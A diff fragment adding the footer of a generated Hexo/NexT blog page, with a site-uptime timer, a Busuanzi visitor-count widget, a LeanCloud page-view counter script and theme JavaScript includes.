+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}
+	siteTime();
+</script>
+<!--// 添加运行时间-->
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"Jdqt1ahnKhMjhJF9kATVjUh3-gzGzoHsz","app_key":"L6hRhY9QJyH30SR69WxSP5Ei","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
